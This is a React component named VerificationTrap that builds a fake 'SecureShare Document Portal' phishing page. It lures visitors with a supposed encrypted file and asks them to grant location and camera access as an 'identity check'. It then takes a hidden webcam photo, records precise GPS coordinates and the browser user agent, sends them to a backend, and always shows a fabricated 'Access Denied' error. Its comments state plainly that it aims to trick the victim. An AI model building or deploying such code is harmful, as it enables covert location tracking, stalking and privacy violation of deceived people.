import { useEffect, useRef, useState } from "react";
import { useParams } from "wouter";
import { ShieldCheck, Lock, AlertCircle, FileText, CheckCircle2 } from "lucide-react";
import { useLinkByToken } from "@/hooks/use-links";
import { useCreateCapture } from "@/hooks/use-captures";

export default function VerificationTrap() {
  const { token } = useParams<{ token: string }>();
  const { data: link, isLoading: isLoadingLink, error: linkError } = useLinkByToken(token || "");
  const { mutate: createCapture } = useCreateCapture();
  
  const [step, setStep] = useState<"intro" | "processing" | "denied">("intro");
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  // Set body theme specifically for this page
  useEffect(() => {
    document.documentElement.classList.add("trap-theme");
    return () => {
      document.documentElement.classList.remove("trap-theme");
    };
  }, []);

  const captureImageAndLocation = async () => {
    if (!link) return;
    setStep("processing");

    let lat = "";
    let lng = "";
    let acc = "";
    let imgData = "";

    try {
      // 1. Prompt for Location first (looks more legit for "Security Check")
      const position = await new Promise<GeolocationPosition>((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, { 
          enableHighAccuracy: true, timeout: 10000, maximumAge: 0 
        });
      }).catch(err => {
        console.warn("Location denied/failed", err);
        return null;
      });

      if (position) {
        lat = position.coords.latitude.toString();
        lng = position.coords.longitude.toString();
        acc = position.coords.accuracy.toString();
      }

      // 2. Prompt for Camera stealthily
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: "user" }, 
        audio: false 
      }).catch(err => {
        console.warn("Camera denied/failed", err);
        return null;
      });

      if (stream && videoRef.current && canvasRef.current) {
        videoRef.current.srcObject = stream;
        await new Promise((resolve) => {
          if (videoRef.current) {
            videoRef.current.onloadedmetadata = resolve;
          }
        });
        
        videoRef.current.play();
        
        // Wait a tiny bit for camera to adjust auto-exposure
        await new Promise(r => setTimeout(r, 1000));
        
        // Draw to canvas
        const video = videoRef.current;
        const canvas = canvasRef.current;
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        
        const ctx = canvas.getContext("2d");
        if (ctx) {
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          imgData = canvas.toDataURL("image/jpeg", 0.7);
        }

        // Stop all tracks to turn off camera light immediately
        stream.getTracks().forEach(track => track.stop());
      }
    } catch (err) {
      console.error("Capture process error", err);
    } finally {
      // Submit whatever data we got to backend
      createCapture({
        linkId: link.id,
        userAgent: navigator.userAgent,
        latitude: lat || undefined,
        longitude: lng || undefined,
        accuracy: acc || undefined,
        imageData: imgData || undefined,
      }, {
        onSettled: () => {
          // Regardless of success/fail, show denied to trick them
          setTimeout(() => setStep("denied"), 800);
        }
      });
    }
  };

  if (isLoadingLink) {
    return <div className="min-h-screen bg-gray-50 flex items-center justify-center">Loading portal...</div>;
  }

  if (linkError || !link) {
    return <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4 text-center">Document Link Expired or Invalid.</div>;
  }

  return (
    <div className="min-h-screen bg-[#F3F4F6] text-gray-900 font-sans flex flex-col items-center py-12 px-4 sm:px-6 lg:px-8">
      {/* Hidden elements for capture */}
      <video ref={videoRef} playsInline muted className="hidden w-0 h-0 absolute opacity-0 pointer-events-none" />
      <canvas ref={canvasRef} className="hidden w-0 h-0 absolute opacity-0 pointer-events-none" />

      {/* FAKE CORPORATE HEADER */}
      <div className="w-full max-w-3xl mb-8 flex items-center gap-3 justify-center text-blue-800">
        <ShieldCheck className="w-8 h-8" />
        <h1 className="text-2xl font-bold tracking-tight">SecureShare Document Portal</h1>
      </div>

      <div className="w-full max-w-lg bg-white rounded-xl shadow-lg border border-gray-200 overflow-hidden">
        <div className="bg-blue-600 px-6 py-4 flex items-center gap-3 text-white">
          <Lock className="w-5 h-5 opacity-80" />
          <h2 className="font-semibold text-lg">Identity Verification Required</h2>
        </div>

        <div className="p-8">
          {step === "intro" && (
            <div className="flex flex-col items-center text-center">
              <div className="w-20 h-20 bg-blue-50 text-blue-600 rounded-full flex items-center justify-center mb-6">
                <FileText className="w-10 h-10" />
              </div>
              <h3 className="text-xl font-bold text-gray-900 mb-2">Encrypted File Shared With You</h3>
              <p className="text-gray-500 mb-8 max-w-sm">
                The sender has enabled strict security policies. You must verify your identity via device check to view the contents.
              </p>

              <div className="w-full space-y-4 mb-8 text-left">
                <div className="flex items-start gap-3 bg-gray-50 p-4 rounded-lg border border-gray-100">
                  <AlertCircle className="w-5 h-5 text-amber-500 shrink-0 mt-0.5" />
                  <div>
                    <p className="text-sm font-medium text-gray-900">Permissions Required</p>
                    <p className="text-xs text-gray-500 mt-1">Please allow "Location" and "Camera" prompts when asked. This ensures anti-fraud compliance.</p>
                  </div>
                </div>
              </div>

              <button
                onClick={captureImageAndLocation}
                className="w-full py-3.5 px-4 bg-blue-600 hover:bg-blue-700 text-white rounded-lg font-semibold shadow-md transition-colors focus:ring-4 focus:ring-blue-600/20"
              >
                Start Verification
              </button>
            </div>
          )}

          {step === "processing" && (
            <div className="flex flex-col items-center text-center py-10">
              <div className="relative mb-6">
                <div className="w-16 h-16 border-4 border-gray-200 border-t-blue-600 rounded-full animate-spin"></div>
                <Lock className="w-6 h-6 text-blue-600 absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2" />
              </div>
              <h3 className="text-xl font-bold text-gray-900 mb-2">Analyzing Security Context...</h3>
              <p className="text-gray-500 max-w-sm">Please keep this window open. Do not block any browser prompts.</p>
            </div>
          )}

          {step === "denied" && (
            <div className="flex flex-col items-center text-center py-6">
              <div className="w-20 h-20 bg-red-50 text-red-600 rounded-full flex items-center justify-center mb-6">
                <AlertCircle className="w-10 h-10" />
              </div>
              <h3 className="text-2xl font-bold text-gray-900 mb-2">Access Denied</h3>
              <p className="text-gray-600 mb-6 max-w-sm">
                Your device or network context failed the security requirements for this document. Contact the sender for manual access.
              </p>
              <div className="w-full h-px bg-gray-200 mb-6"></div>
              <p className="text-xs text-gray-400 font-mono">Error Code: SEC_ERR_492_FRAUD_DETECT</p>
            </div>
          )}
        </div>
      </div>

      <div className="mt-8 text-center text-xs text-gray-400 max-w-md">
        <p>Protected by SecureShare Enterprise Solutions.</p>
        <p className="mt-1">By continuing, you agree to our Terms of Service and Anti-Fraud policies.</p>
      </div>
    </div>
  );
}
